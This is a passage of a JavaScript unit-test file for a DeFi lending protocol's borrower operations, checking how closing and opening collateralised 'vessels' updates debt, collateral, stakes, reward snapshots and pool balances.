			await assertRevert(
				borrowerOperations.closeVessel(erc20.address, { from: carol }),
				"BorrowerOps: Operation not permitted during Recovery Mode"
			)
		})

		it("closeVessel(): reverts when vessel is the only one in the system", async () => {
			await openVessel({
				asset: erc20.address,
				extraVUSDAmount: toBN(dec(100000, 18)),
				ICR: toBN(dec(2, 18)),
				extraParams: { from: alice },
			})

			// Artificially mint to Alice so she has enough to close her vessel
			await debtToken.unprotectedMint(alice, dec(100000, 18))

			// Check she has more VUSD than her vessel debt
			const aliceBal = await debtToken.balanceOf(alice)

			const aliceDebt_Asset = await getVesselEntireDebt(alice, erc20.address)
			assert.isTrue(aliceBal.gt(aliceDebt_Asset))

			// check Recovery Mode
			assert.isFalse(await th.checkRecoveryMode(contracts, erc20.address))

			// Alice attempts to close her vessel
			await assertRevert(
				borrowerOperations.closeVessel(erc20.address, { from: alice }),
				"VesselManager: Only one vessel in the system"
			)
		})

		it("closeVessel(): reduces a Vessel's collateral to zero", async () => {
			await openVessel({
				asset: erc20.address,
				extraVUSDAmount: toBN(dec(10000, 18)),
				ICR: toBN(dec(2, 18)),
				extraParams: { from: dennis },
			})
			await openVessel({
				asset: erc20.address,
				extraVUSDAmount: toBN(dec(10000, 18)),
				ICR: toBN(dec(2, 18)),
				extraParams: { from: alice },
			})

			const dennisVUSD = await debtToken.balanceOf(dennis)

			assert.isTrue(dennisVUSD.gt(toBN("0")))

			const aliceCollBefore_Asset = await getVesselEntireColl(alice, erc20.address)
			assert.isTrue(aliceCollBefore_Asset.gt(toBN("0")))

			// To compensate borrowing fees
			await debtToken.transfer(alice, dennisVUSD.div(toBN(2)), { from: dennis })

			// Alice attempts to close vessel
			await borrowerOperations.closeVessel(erc20.address, { from: alice })

			const aliceCollAfter_Asset = await getVesselEntireColl(alice, erc20.address)

			assert.equal(aliceCollAfter_Asset, "0")
		})

		it("closeVessel(): reduces a Vessel's debt to zero", async () => {
			await openVessel({
				asset: erc20.address,
				extraVUSDAmount: toBN(dec(10000, 18)),
				ICR: toBN(dec(2, 18)),
				extraParams: { from: dennis },
			})
			await openVessel({
				asset: erc20.address,
				extraVUSDAmount: toBN(dec(10000, 18)),
				ICR: toBN(dec(2, 18)),
				extraParams: { from: alice },
			})

			const aliceDebtBefore_Asset = await getVesselEntireColl(alice, erc20.address)
			const dennisVUSD = await debtToken.balanceOf(dennis)

			assert.isTrue(aliceDebtBefore_Asset.gt(toBN("0")))
			assert.isTrue(dennisVUSD.gt(toBN("0")))

			// To compensate borrowing fees
			await debtToken.transfer(alice, dennisVUSD.div(toBN(2)), { from: dennis })

			// Alice attempts to close vessel
			await borrowerOperations.closeVessel(erc20.address, { from: alice })

			const aliceCollAfter_Asset = await getVesselEntireColl(alice, erc20.address)

			assert.equal(aliceCollAfter_Asset, "0")
		})

		it("closeVessel(): sets Vessel's stake to zero", async () => {
			await openVessel({
				asset: erc20.address,
				extraVUSDAmount: toBN(dec(10000, 18)),
				ICR: toBN(dec(2, 18)),
				extraParams: { from: dennis },
			})
			await openVessel({
				asset: erc20.address,
				extraVUSDAmount: toBN(dec(10000, 18)),
				ICR: toBN(dec(2, 18)),
				extraParams: { from: alice },
			})

			const aliceStakeBefore_Asset = await getVesselStake(alice, erc20.address)
			assert.isTrue(aliceStakeBefore_Asset.gt(toBN("0")))

			const dennisVUSD = await debtToken.balanceOf(dennis)
			assert.isTrue(dennisVUSD.gt(toBN("0")))

			// To compensate borrowing fees
			await debtToken.transfer(alice, dennisVUSD.div(toBN(2)), { from: dennis })

			// Alice attempts to close vessel
			await borrowerOperations.closeVessel(erc20.address, { from: alice })

			const stakeAfter_Asset = (await vesselManager.Vessels(alice, erc20.address))[2].toString()
			assert.equal(stakeAfter_Asset, "0")
		})

		it("closeVessel(): zero's the vessels reward snapshots", async () => {
			// Dennis opens vessel and transfers tokens to alice

			await openVessel({
				asset: erc20.address,
				extraVUSDAmount: toBN(dec(10000, 18)),
				ICR: toBN(dec(2, 18)),
				extraParams: { from: dennis },
			})
			await openVessel({
				asset: erc20.address,
				extraVUSDAmount: toBN(dec(10000, 18)),
				ICR: toBN(dec(2, 18)),
				extraParams: { from: bob },
			})

			// Price drops
			await priceFeed.setPrice(erc20.address, dec(100, 18))

			// Liquidate Bob
			await vesselManagerOperations.liquidate(erc20.address, bob)
			assert.isFalse(await sortedVessels.contains(erc20.address, bob))

			// Price bounces back
			await priceFeed.setPrice(erc20.address, dec(200, 18))

			// Alice and Carol open vessels

			await openVessel({
				asset: erc20.address,
				extraVUSDAmount: toBN(dec(10000, 18)),
				ICR: toBN(dec(2, 18)),
				extraParams: { from: alice },
			})
			await openVessel({
				asset: erc20.address,
				extraVUSDAmount: toBN(dec(10000, 18)),
				ICR: toBN(dec(2, 18)),
				extraParams: { from: carol },
			})

			// Price drops ...again
			await priceFeed.setPrice(erc20.address, dec(100, 18))

			// Get Alice's pending reward snapshots
			const L_ETH_A_Snapshot_Asset = (await vesselManager.rewardSnapshots(alice, erc20.address))[0]
			const L_VUSDDebt_A_Snapshot_Asset = (await vesselManager.rewardSnapshots(alice, erc20.address))[1]
			assert.isTrue(L_ETH_A_Snapshot_Asset.gt(toBN("0")))
			assert.isTrue(L_VUSDDebt_A_Snapshot_Asset.gt(toBN("0")))

			// Liquidate Carol
			await vesselManagerOperations.liquidate(erc20.address, carol)
			assert.isFalse(await sortedVessels.contains(erc20.address, carol))

			// Get Alice's pending reward snapshots after Carol's liquidation. Check above 0

			const L_ETH_Snapshot_A_AfterLiquidation_Asset = (await vesselManager.rewardSnapshots(alice, erc20.address))[0]
			const L_VUSDDebt_Snapshot_A_AfterLiquidation_Asset = (
				await vesselManager.rewardSnapshots(alice, erc20.address)
			)[1]

			assert.isTrue(L_ETH_Snapshot_A_AfterLiquidation_Asset.gt(toBN("0")))
			assert.isTrue(L_VUSDDebt_Snapshot_A_AfterLiquidation_Asset.gt(toBN("0")))

			// to compensate borrowing fees
			await debtToken.transfer(alice, await debtToken.balanceOf(dennis), { from: dennis })

			await priceFeed.setPrice(erc20.address, dec(200, 18))

			// Alice closes vessel
			await borrowerOperations.closeVessel(erc20.address, { from: alice })

			// Check Alice's pending reward snapshots are zero

			const L_ETH_Snapshot_A_afterAliceCloses_Asset = (await vesselManager.rewardSnapshots(alice, erc20.address))[0]
			const L_VUSDDebt_Snapshot_A_afterAliceCloses_Asset = (
				await vesselManager.rewardSnapshots(alice, erc20.address)
			)[1]

			assert.equal(L_ETH_Snapshot_A_afterAliceCloses_Asset, "0")
			assert.equal(L_VUSDDebt_Snapshot_A_afterAliceCloses_Asset, "0")
		})

		it("closeVessel(): sets vessel's status to closed and removes it from sorted vessels list", async () => {
			await openVessel({
				asset: erc20.address,
				extraVUSDAmount: toBN(dec(10000, 18)),
				ICR: toBN(dec(2, 18)),
				extraParams: { from: dennis },
			})
			await openVessel({
				asset: erc20.address,
				extraVUSDAmount: toBN(dec(10000, 18)),
				ICR: toBN(dec(2, 18)),
				extraParams: { from: alice },
			})

			// Check Vessel is active

			const alice_Vessel_Before_Asset = await vesselManager.Vessels(alice, erc20.address)
			const status_Before_Asset = alice_Vessel_Before_Asset[th.VESSEL_STATUS_INDEX]

			assert.equal(status_Before_Asset, 1)
			assert.isTrue(await sortedVessels.contains(erc20.address, alice))

			// to compensate borrowing fees
			await debtToken.transfer(alice, await debtToken.balanceOf(dennis), { from: dennis })

			// Close the vessel

			await debtToken.transfer(alice, await debtToken.balanceOf(dennis), { from: dennis })
			await borrowerOperations.closeVessel(erc20.address, { from: alice })

			const alice_Vessel_After_Asset = await vesselManager.Vessels(alice, erc20.address)
			const status_After_Asset = alice_Vessel_After_Asset[th.VESSEL_STATUS_INDEX]

			assert.equal(status_After_Asset, 2)
			assert.isFalse(await sortedVessels.contains(erc20.address, alice))
		})

		it("closeVessel(): reduces ActivePool ETH and raw ether by correct amount", async () => {
			await openVessel({
				asset: erc20.address,
				extraVUSDAmount: toBN(dec(10000, 18)),
				ICR: toBN(dec(2, 18)),
				extraParams: { from: dennis },
			})
			await openVessel({
				asset: erc20.address,
				extraVUSDAmount: toBN(dec(10000, 18)),
				ICR: toBN(dec(2, 18)),
				extraParams: { from: alice },
			})

			const dennisColl = await getVesselEntireColl(dennis)
			const aliceColl = await getVesselEntireColl(alice)
			assert.isTrue(dennisColl.gt("0"))
			assert.isTrue(aliceColl.gt("0"))

			const dennisColl_Asset = await getVesselEntireColl(dennis, erc20.address)
			const aliceColl_Asset = await getVesselEntireColl(alice, erc20.address)
			assert.isTrue(dennisColl_Asset.gt("0"))
			assert.isTrue(aliceColl_Asset.gt("0"))

			// Check active Pool ETH before
			const activePool_ETH_before_Asset = await activePool.getAssetBalance(erc20.address)

			const activePool_RawEther_before_Asset = toBN(await erc20.balanceOf(activePool.address))

			assert.isTrue(activePool_ETH_before_Asset.eq(aliceColl_Asset.add(dennisColl_Asset)))

			assert.isTrue(activePool_ETH_before_Asset.gt(toBN("0")))

			assert.isTrue(activePool_RawEther_before_Asset.eq(activePool_ETH_before_Asset))

			// to compensate borrowing fees
			await debtToken.transfer(alice, await debtToken.balanceOf(dennis), { from: dennis })

			// Close the vessel
			await borrowerOperations.closeVessel(erc20.address, { from: alice })

			// Check after

			const activePool_ETH_After_Asset = await activePool.getAssetBalance(erc20.address)
			const activePool_RawEther_After_Asset = toBN(await erc20.balanceOf(activePool.address))
			assert.isTrue(activePool_ETH_After_Asset.eq(dennisColl_Asset))
			assert.isTrue(activePool_RawEther_After_Asset.eq(dennisColl_Asset))
		})

		it("closeVessel(): reduces ActivePool debt by correct amount", async () => {
			await openVessel({
				asset: erc20.address,
				extraVUSDAmount: toBN(dec(10000, 18)),
				ICR: toBN(dec(2, 18)),
				extraParams: { from: dennis },
			})
			await openVessel({
				asset: erc20.address,
				extraVUSDAmount: toBN(dec(10000, 18)),
				ICR: toBN(dec(2, 18)),
				extraParams: { from: alice },
			})

			const dennisDebt_Asset = await getVesselEntireDebt(dennis, erc20.address)
			const aliceDebt_Asset = await getVesselEntireDebt(alice, erc20.address)

			assert.isTrue(dennisDebt_Asset.gt("0"))
			assert.isTrue(aliceDebt_Asset.gt("0"))

			// Check before
			const activePool_Debt_before_Asset = await activePool.getDebtTokenBalance(erc20.address)

			assert.isTrue(activePool_Debt_before_Asset.eq(aliceDebt_Asset.add(dennisDebt_Asset)))
			assert.isTrue(activePool_Debt_before_Asset.gt(toBN("0")))

			// to compensate borrowing fees
			await debtToken.transfer(alice, await debtToken.balanceOf(dennis), { from: dennis })

			// Close the vessel
			await borrowerOperations.closeVessel(erc20.address, { from: alice })

			// Check after

			const activePool_Debt_After_Asset = (await activePool.getDebtTokenBalance(erc20.address)).toString()
			th.assertIsApproximatelyEqual(activePool_Debt_After_Asset, dennisDebt_Asset)
		})

		it("closeVessel(): updates the the total stakes", async () => {
			await openVessel({
				asset: erc20.address,
				extraVUSDAmount: toBN(dec(10000, 18)),
				ICR: toBN(dec(2, 18)),
				extraParams: { from: dennis },
			})
			await openVessel({
				asset: erc20.address,
				extraVUSDAmount: toBN(dec(10000, 18)),
				ICR: toBN(dec(2, 18)),
				extraParams: { from: alice },
			})
			await openVessel({
				asset: erc20.address,
				extraVUSDAmount: toBN(dec(10000, 18)),
				ICR: toBN(dec(2, 18)),
				extraParams: { from: bob },
			})

			// Get individual stakes

			const aliceStakeBefore_Asset = await getVesselStake(alice, erc20.address)
			const bobStakeBefore_Asset = await getVesselStake(bob, erc20.address)
			const dennisStakeBefore_Asset = await getVesselStake(dennis, erc20.address)

			assert.isTrue(aliceStakeBefore_Asset.gt("0"))
			assert.isTrue(bobStakeBefore_Asset.gt("0"))
			assert.isTrue(dennisStakeBefore_Asset.gt("0"))

			const totalStakesBefore_Asset = await vesselManager.totalStakes(erc20.address)

			assert.isTrue(
				totalStakesBefore_Asset.eq(aliceStakeBefore_Asset.add(bobStakeBefore_Asset).add(dennisStakeBefore_Asset))
			)

			// to compensate borrowing fees
			await debtToken.transfer(alice, await debtToken.balanceOf(dennis), { from: dennis })

			// Alice closes vessel
			await borrowerOperations.closeVessel(erc20.address, { from: alice })

			// Check stake and total stakes get updated

			const aliceStakeAfter_Asset = await getVesselStake(alice, erc20.address)
			const totalStakesAfter_Asset = await vesselManager.totalStakes(erc20.address)

			assert.equal(aliceStakeAfter_Asset, 0)
			assert.isTrue(totalStakesAfter_Asset.eq(totalStakesBefore_Asset.sub(aliceStakeBefore_Asset)))
		})

		if (!withProxy) {
			// TODO: wrap web3.eth.getBalance to be able to go through proxies
			it("closeVessel(): sends the correct amount of ETH to the user", async () => {
				await openVessel({
					asset: erc20.address,
					extraVUSDAmount: toBN(dec(10000, 18)),
					ICR: toBN(dec(2, 18)),
					extraParams: { from: dennis },
				})
				await openVessel({
					asset: erc20.address,
					extraVUSDAmount: toBN(dec(10000, 18)),
					ICR: toBN(dec(2, 18)),
					extraParams: { from: alice },
				})

				const aliceColl_Asset = await getVesselEntireColl(alice, erc20.address)
				assert.isTrue(aliceColl_Asset.gt(toBN("0")))

				const alice_ETHBalance_Before_Asset = web3.utils.toBN(await erc20.balanceOf(alice))

				// to compensate borrowing fees
				await debtToken.transfer(alice, await debtToken.balanceOf(dennis), { from: dennis })

				await borrowerOperations.closeVessel(erc20.address, { from: alice })

				const alice_ETHBalance_After_Asset = web3.utils.toBN(await erc20.balanceOf(alice))

				const balanceDiff_Asset = alice_ETHBalance_After_Asset.sub(alice_ETHBalance_Before_Asset)

				assert.isTrue(balanceDiff_Asset.eq(aliceColl_Asset))
			})
		}

		it("closeVessel(): subtracts the debt of the closed Vessel from the Borrower's debtToken balance", async () => {
			await openVessel({
				asset: erc20.address,
				extraVUSDAmount: toBN(dec(10000, 18)),
				ICR: toBN(dec(2, 18)),
				extraParams: { from: dennis },
			})
			await openVessel({
				asset: erc20.address,
				extraVUSDAmount: toBN(dec(10000, 18)),
				ICR: toBN(dec(2, 18)),
				extraParams: { from: alice },
			})

			const aliceDebt_Asset = await getVesselEntireDebt(alice, erc20.address)
			assert.isTrue(aliceDebt_Asset.gt(toBN("0")))
			const netDebt = aliceDebt_Asset.sub(VUSD_GAS_COMPENSATION_ERC20)

			// to compensate borrowing fees
			await debtToken.transfer(alice, await debtToken.balanceOf(dennis), { from: dennis })

			const alice_VUSDBalance_Before = await debtToken.balanceOf(alice)
			assert.isTrue(alice_VUSDBalance_Before.gt(toBN("0")))

			// close vessel
			await borrowerOperations.closeVessel(erc20.address, { from: alice })

			// check alice balance after
			const alice_VUSDBalance_After = await debtToken.balanceOf(alice)
			// accept 0,5% error margin, as part of the fee will be refunded
			const error = Number(aliceDebt_Asset.mul(toBN(5)).div(toBN(1_000)))
			const debitated = alice_VUSDBalance_Before.sub(alice_VUSDBalance_After)
			th.assertIsApproximatelyEqual(netDebt, debitated, error)
		})

		it("closeVessel(): applies pending rewards", async () => {
			// --- SETUP ---
			await openVessel({
				asset: erc20.address,
				extraVUSDAmount: toBN(dec(1000000, 18)),
				ICR: toBN(dec(10, 18)),
				extraParams: { from: whale },
			})

			await openVessel({
				asset: erc20.address,
				extraVUSDAmount: toBN(dec(15000, 18)),
				ICR: toBN(dec(2, 18)),
				extraParams: { from: alice },
			})
			await openVessel({
				asset: erc20.address,
				extraVUSDAmount: toBN(dec(5000, 18)),
				ICR: toBN(dec(2, 18)),
				extraParams: { from: bob },
			})
			await openVessel({
				asset: erc20.address,
				extraVUSDAmount: toBN(dec(10000, 18)),
				ICR: toBN(dec(2, 18)),
				extraParams: { from: carol },
			})

			// Whale transfers to A and B to cover their fees
			await debtToken.transfer(alice, dec(10000, 18), { from: whale })
			await debtToken.transfer(bob, dec(10000, 18), { from: whale })

			// --- TEST ---

			// price drops to 1ETH:100VUSD, reducing Carol's ICR below MCR
			await priceFeed.setPrice(erc20.address, dec(100, 18))
			const price = await priceFeed.getPrice(erc20.address)

			// liquidate Carol's Vessel, Alice and Bob earn rewards.

			const liquidationTx_Asset = await vesselManagerOperations.liquidate(erc20.address, carol, {
				from: owner,
			})
			const [liquidatedDebt_C_Asset, liquidatedColl_C_Asset] = th.getEmittedLiquidationValues(liquidationTx_Asset)

			// Dennis opens a new Vessel
			await openVessel({
				asset: erc20.address,
				extraVUSDAmount: toBN(dec(10000, 18)),
				ICR: toBN(dec(2, 18)),
				extraParams: { from: carol },
			})

			// check Alice and Bob's reward snapshots are zero before they alter their Vessels

			const alice_rewardSnapshot_Before_Asset = await vesselManager.rewardSnapshots(alice, erc20.address)
			const alice_ETHrewardSnapshot_Before_Asset = alice_rewardSnapshot_Before_Asset[0]
			const alice_VUSDDebtRewardSnapshot_Before_Asset = alice_rewardSnapshot_Before_Asset[1]

			const bob_rewardSnapshot_Before_Asset = await vesselManager.rewardSnapshots(bob, erc20.address)
			const bob_ETHrewardSnapshot_Before_Asset = bob_rewardSnapshot_Before_Asset[0]
			const bob_VUSDDebtRewardSnapshot_Before_Asset = bob_rewardSnapshot_Before_Asset[1]

			assert.equal(alice_ETHrewardSnapshot_Before_Asset, 0)
			assert.equal(alice_VUSDDebtRewardSnapshot_Before_Asset, 0)
			assert.equal(bob_ETHrewardSnapshot_Before_Asset, 0)
			assert.equal(bob_VUSDDebtRewardSnapshot_Before_Asset, 0)

			const defaultPool_ETH_Asset = await defaultPool.getAssetBalance(erc20.address)
			const defaultPooL_VUSDDebt_Asset = await defaultPool.getDebtTokenBalance(erc20.address)

			// Carol's liquidated coll (1 ETH) and drawn debt should have entered the Default Pool

			assert.isAtMost(th.getDifference(defaultPool_ETH_Asset, liquidatedColl_C_Asset), 100)
			assert.isAtMost(th.getDifference(defaultPooL_VUSDDebt_Asset, liquidatedDebt_C_Asset), 100)

			const pendingCollReward_A_Asset = await vesselManager.getPendingAssetReward(erc20.address, alice)
			const pendingDebtReward_A_Asset = await vesselManager.getPendingDebtTokenReward(erc20.address, alice)

			assert.isTrue(pendingCollReward_A_Asset.gt("0"))
			assert.isTrue(pendingDebtReward_A_Asset.gt("0"))

			// Close Alice's vessel. Alice's pending rewards should be removed from the DefaultPool when she close.
			await borrowerOperations.closeVessel(erc20.address, { from: alice })

			const defaultPool_ETH_afterAliceCloses_Asset = await defaultPool.getAssetBalance(erc20.address)
			const defaultPooL_VUSDDebt_afterAliceCloses_Asset = await defaultPool.getDebtTokenBalance(erc20.address)

			assert.isAtMost(
				th.getDifference(defaultPool_ETH_afterAliceCloses_Asset, defaultPool_ETH_Asset.sub(pendingCollReward_A_Asset)),
				1000
			)
			assert.isAtMost(
				th.getDifference(
					defaultPooL_VUSDDebt_afterAliceCloses_Asset,
					defaultPooL_VUSDDebt_Asset.sub(pendingDebtReward_A_Asset)
				),
				1000
			)

			// whale adjusts vessel, pulling their rewards out of DefaultPool
			await borrowerOperations.adjustVessel(erc20.address, 0, 0, dec(1, 18), true, whale, whale, { from: whale })

			// Close Bob's vessel. Expect DefaultPool coll and debt to drop to 0, since closing pulls his rewards out.
			await borrowerOperations.closeVessel(erc20.address, { from: bob })

			const defaultPool_ETH_afterBobCloses_Asset = await defaultPool.getAssetBalance(erc20.address)
			const defaultPooL_VUSDDebt_afterBobCloses_Asset = await defaultPool.getDebtTokenBalance(erc20.address)

			assert.isAtMost(th.getDifference(defaultPool_ETH_afterBobCloses_Asset, 0), 100000)
			assert.isAtMost(th.getDifference(defaultPooL_VUSDDebt_afterBobCloses_Asset, 0), 100000)
		})

		it("closeVessel(): reverts if borrower has insufficient VUSD balance to repay his entire debt", async () => {
			await openVessel({
				asset: erc20.address,
				extraVUSDAmount: toBN(dec(15000, 18)),
				ICR: toBN(dec(2, 18)),
				extraParams: { from: A },
			})

			await openVessel({
				asset: erc20.address,
				extraVUSDAmount: toBN(dec(5000, 18)),
				ICR: toBN(dec(2, 18)),
				extraParams: { from: B },
			})
			//Confirm Bob's VUSD balance is less than his vessel debt

			const B_VUSDBal_Asset = await debtToken.balanceOf(B)
			const B_vesselDebt_Asset = await getVesselEntireDebt(B, erc20.address)

			assert.isTrue(B_VUSDBal_Asset.lt(B_vesselDebt_Asset))

			const closeVesselPromise_B_Asset = borrowerOperations.closeVessel(erc20.address, {
				from: B,
			})
			await assertRevert(closeVesselPromise_B_Asset, "BorrowerOps: Caller doesnt have enough VUSD to make repayment")
		})

		// --- openVessel() ---

		if (!withProxy) {
			// TODO: use rawLogs instead of logs
			it("openVessel(): emits a VesselUpdated event with the correct collateral and debt", async () => {
				const txA_Asset = (
					await openVessel({
						asset: erc20.address,
						extraVUSDAmount: toBN(dec(15000, 18)),
						ICR: toBN(dec(2, 18)),
						extraParams: { from: A },
					})
				).tx
				const txB_Asset = (
					await openVessel({
						asset: erc20.address,
						extraVUSDAmount: toBN(dec(5000, 18)),
						ICR: toBN(dec(2, 18)),
						extraParams: { from: B },
					})
				).tx
				const txC_Asset = (
					await openVessel({
						asset: erc20.address,
						extraVUSDAmount: toBN(dec(3000, 18)),
						ICR: toBN(dec(2, 18)),
						extraParams: { from: C },
					})
				).tx

				const A_Coll_Asset = await getVesselEntireColl(A, erc20.address)
				const B_Coll_Asset = await getVesselEntireColl(B, erc20.address)
				const C_Coll_Asset = await getVesselEntireColl(C, erc20.address)
				const A_Debt_Asset = await getVesselEntireDebt(A, erc20.address)
				const B_Debt_Asset = await getVesselEntireDebt(B, erc20.address)
				const C_Debt_Asset = await getVesselEntireDebt(C, erc20.address)

				const A_emittedDebt_Asset = toBN(th.getEventArgByName(txA_Asset, "VesselUpdated", "_debt"))
				const A_emittedColl_Asset = toBN(th.getEventArgByName(txA_Asset, "VesselUpdated", "_coll"))
				const B_emittedDebt_Asset = toBN(th.getEventArgByName(txB_Asset, "VesselUpdated", "_debt"))
				const B_emittedColl_Asset = toBN(th.getEventArgByName(txB_Asset, "VesselUpdated", "_coll"))
				const C_emittedDebt_Asset = toBN(th.getEventArgByName(txC_Asset, "VesselUpdated", "_debt"))
				const C_emittedColl_Asset = toBN(th.getEventArgByName(txC_Asset, "VesselUpdated", "_coll"))

				// Check emitted debt values are correct

				assert.isTrue(A_Debt_Asset.eq(A_emittedDebt_Asset))
				assert.isTrue(B_Debt_Asset.eq(B_emittedDebt_Asset))
				assert.isTrue(C_Debt_Asset.eq(C_emittedDebt_Asset))

				// Check emitted coll values are correct
				assert.isTrue(A_Coll_Asset.eq(A_emittedColl_Asset))
				assert.isTrue(B_Coll_Asset.eq(B_emittedColl_Asset))
				assert.isTrue(C_Coll_Asset.eq(C_emittedColl_Asset))

				const baseRateBefore_Asset = await adminContract.getBorrowingFee(erc20.address)

				// Artificially make baseRate 5%
				// await vesselManager.setBaseRate(erc20.address, dec(5, 16))
				// await vesselManager.setLastFeeOpTimeToNow(erc20.address)
				// await adminContract.setBorrowingFee(erc20.address, dec(5, 16))

				// assert.isTrue(
				// 	(await adminContract.getBorrowingFee(erc20.address)).gt(baseRateBefore_Asset)
				// )

				const txD_Asset = (
					await openVessel({
						asset: erc20.address,
						extraVUSDAmount: toBN(dec(5000, 18)),
						ICR: toBN(dec(2, 18)),
						extraParams: { from: D },
					})
				).tx
				const txE_Asset = (
					await openVessel({
						asset: erc20.address,
						extraVUSDAmount: toBN(dec(3000, 18)),
						ICR: toBN(dec(2, 18)),
						extraParams: { from: E },
					})
				).tx

				const D_Coll_Asset = await getVesselEntireColl(D, erc20.address)
				const E_Coll_Asset = await getVesselEntireColl(E, erc20.address)
				const D_Debt_Asset = await getVesselEntireDebt(D, erc20.address)
				const E_Debt_Asset = await getVesselEntireDebt(E, erc20.address)

				const D_emittedDebt_Asset = toBN(th.getEventArgByName(txD_Asset, "VesselUpdated", "_debt"))
				const D_emittedColl_Asset = toBN(th.getEventArgByName(txD_Asset, "VesselUpdated", "_coll"))
				const E_emittedDebt_Asset = toBN(th.getEventArgByName(txE_Asset, "VesselUpdated", "_debt"))
				const E_emittedColl_Asset = toBN(th.getEventArgByName(txE_Asset, "VesselUpdated", "_coll"))

				// Check emitted debt values are correct

				assert.isTrue(D_Debt_Asset.eq(D_emittedDebt_Asset))
				assert.isTrue(E_Debt_Asset.eq(E_emittedDebt_Asset))

				// Check emitted coll values are correct

				assert.isTrue(D_Coll_Asset.eq(D_emittedColl_Asset))
				assert.isTrue(E_Coll_Asset.eq(E_emittedColl_Asset))
			})
		}

		it("openVessel(): Opens a vessel with net debt >= minimum net debt", async () => {
			// Add 1 wei to correct for rounding error in helper function

			await adminContract.setMintCap(erc20.address, dec(100, 35))
			const mintCap = await adminContract.getMintCap(erc20.address)

			const txA_Asset = await borrowerOperations.openVessel(
				erc20.address,
				dec(100, 30),
				await getNetBorrowingAmount(MIN_NET_DEBT_ERC20.add(toBN(1)), erc20.address),
				A,
				A,
				{ from: A }
			)
			assert.isTrue(txA_Asset.receipt.status)
			assert.isTrue(await sortedVessels.contains(erc20.address, A))

			const txC_Asset = await borrowerOperations.openVessel(
				erc20.address,
				dec(100, 30),
				await getNetBorrowingAmount(MIN_NET_DEBT_ERC20.add(toBN(dec(47789898, 22)), erc20.address)),
				A,
				A,
				{ from: C }
			)
			assert.isTrue(txC_Asset.receipt.status)
			assert.isTrue(await sortedVessels.contains(erc20.address, C))
		})

		it("openVessel(): reverts if net debt < minimum net debt", async () => {
			const txAPromise_Asset = borrowerOperations.openVessel(erc20.address, dec(100, 30), 0, A, A, { from: A })
			await assertRevert(txAPromise_Asset, "revert")

			const txBPromise_Asset = borrowerOperations.openVessel(
				erc20.address,
				dec(100, 30),
				await getNetBorrowingAmount(MIN_NET_DEBT_ERC20.sub(toBN(1)), erc20.address),
				B,
				B,
				{ from: B }
			)
			await assertRevert(txBPromise_Asset, "revert")

			const txCPromise_Asset = borrowerOperations.openVessel(
				erc20.address,
				dec(100, 30),
				MIN_NET_DEBT_ERC20.sub(toBN(dec(173, 18))),
				C,
				C,
				{ from: C }
			)
			await assertRevert(txCPromise_Asset, "revert")
		})

		// Commented out as we have now a fixed borrowingfee
		/* it("openVessel(): decays a non-zero base rate", async () => {
			await openVessel({
				asset: erc20.address,
				extraVUSDAmount: toBN(dec(10000, 18)),
				ICR: toBN(dec(10, 18)),
				extraParams: { from: whale },
			})
			await openVessel({
				asset: erc20.address,
				extraVUSDAmount: toBN(dec(20000, 18)),
				ICR: toBN(dec(2, 18)),
				extraParams: { from: A },
			})
			await openVessel({
				asset: erc20.address,
				extraVUSDAmount: toBN(dec(30000, 18)),
				ICR: toBN(dec(2, 18)),
				extraParams: { from: B },
			})
			await openVessel({
				asset: erc20.address,
				extraVUSDAmount: toBN(dec(40000, 18)),
				ICR: toBN(dec(2, 18)),
				extraParams: { from: C },
			})
			// Artificially make baseRate 5%
			// await vesselManager.setBaseRate(erc20.address, dec(5, 16))
			// await vesselManager.setLastFeeOpTimeToNow(erc20.address)
			// Check baseRate is now non-zero
			// assert.isTrue(baseRate_1.gt(toBN("0")))
			const baseRate_1_Asset = await adminContract.getBorrowingFee(erc20.address)
			assert.isTrue(baseRate_1_Asset.gt(toBN("0")))
			// 2 hours pass
			th.fastForwardTime(7200, web3.currentProvider)
			// D opens vessel
			await openVessel({
				asset: erc20.address,
				extraVUSDAmount: toBN(dec(37, 18)),
				ICR: toBN(dec(2, 18)),
				extraParams: { from: D },
			})
			// Check baseRate has decreased
			assert.isTrue(baseRate_2.lt(baseRate_1))
			const baseRate_2_Asset = await adminContract.getBorrowingFee(erc20.address)
			assert.isTrue(baseRate_2_Asset.lt(baseRate_1_Asset))
			// 1 hour passes
			th.fastForwardTime(3600, web3.currentProvider)
			// E opens vessel
			await openVessel({
				asset: erc20.address,
				extraVUSDAmount: toBN(dec(12, 18)),
				ICR: toBN(dec(2, 18)),
				extraParams: { from: E },
			})
			assert.isTrue(baseRate_3.lt(baseRate_2))
			const baseRate_3_Asset = await adminContract.getBorrowingFee(erc20.address)
			assert.isTrue(baseRate_3_Asset.lt(baseRate_2_Asset))
		})
		it("openVessel(): doesn't change base rate if it is already zero", async () => {
			await openVessel({
				asset: erc20.address,
				extraVUSDAmount: toBN(dec(10000, 18)),
				ICR: toBN(dec(10, 18)),
				extraParams: { from: whale },
			})
			await openVessel({
				asset: erc20.address,
				extraVUSDAmount: toBN(dec(20000, 18)),
				ICR: toBN(dec(2, 18)),
				extraParams: { from: A },
			})
			await openVessel({
				asset: erc20.address,
				extraVUSDAmount: toBN(dec(30000, 18)),
				ICR: toBN(dec(2, 18)),
				extraParams: { from: B },
			})
			await openVessel({
				asset: erc20.address,
				extraVUSDAmount: toBN(dec(40000, 18)),
				ICR: toBN(dec(2, 18)),
				extraParams: { from: C },
			})
			// Check baseRate is zero
			// assert.equal(baseRate_1, "0")
			const baseRate_1_Asset = await adminContract.getBorrowingFee(erc20.address)
			assert.equal(baseRate_1_Asset, "0")
			// 2 hours pass
			th.fastForwardTime(7200, web3.currentProvider)
			// D opens vessel
			await openVessel({
				asset: erc20.address,
				extraVUSDAmount: toBN(dec(37, 18)),
				ICR: toBN(dec(2, 18)),
				extraParams: { from: D },
			})
			// Check baseRate is still 0
			assert.equal(baseRate_2, "0")
			const baseRate_2_Asset = await adminContract.getBorrowingFee(erc20.address)
			assert.equal(baseRate_2_Asset, "0")
			// 1 hour passes
			th.fastForwardTime(3600, web3.currentProvider)
			// E opens vessel
			await openVessel({
				asset: erc20.address,
				extraVUSDAmount: toBN(dec(12, 18)),
				ICR: toBN(dec(2, 18)),
				extraParams: { from: E },
			})
			assert.equal(baseRate_3, "0")
			const baseRate_3_Asset = await adminContract.getBorrowingFee(erc20.address)
			assert.equal(baseRate_3_Asset, "0")
		})
		it("openVessel(): lastFeeOpTime doesn't update if less time than decay interval has passed since the last fee operation", async () => {
			await openVessel({
				asset: erc20.address,
				extraVUSDAmount: toBN(dec(10000, 18)),
				ICR: toBN(dec(10, 18)),
				extraParams: { from: whale },
			})
			await openVessel({
